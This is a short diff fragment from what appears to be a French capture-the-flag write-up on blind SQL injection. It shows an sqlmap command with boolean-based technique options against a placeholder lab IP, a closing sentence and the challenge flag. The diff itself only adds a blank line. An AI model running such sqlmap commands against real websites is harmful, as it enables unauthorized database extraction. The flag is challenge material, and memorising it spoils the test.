@@ -25,3 +25,4 @@ sqlmap -u "http://<ip>/?search=TXN-12345" -p "search" --technique=B -T administr
 Une fois le processus automatisé terminé, on obtient la chaîne complète.
 
 **Flag:** `HTS{Bl1nd_SQLi_R3qu1r3s_P4t13nc3}`
+ 
